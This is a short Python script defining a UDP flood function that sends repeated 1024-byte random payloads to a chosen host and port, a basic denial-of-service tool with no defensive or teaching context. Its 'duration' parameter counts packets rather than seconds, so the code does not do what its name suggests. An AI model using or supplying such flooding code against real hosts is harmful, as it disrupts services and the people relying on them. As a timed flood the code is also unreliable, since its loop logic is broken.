import socket
import os


def udp_flood(host, port, duration=30):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = os.urandom(1024)
    while duration > 0:
        try:
            s.sendto(payload, (host, port))
        except Exception:
            break
        duration -= 1
    s.close()
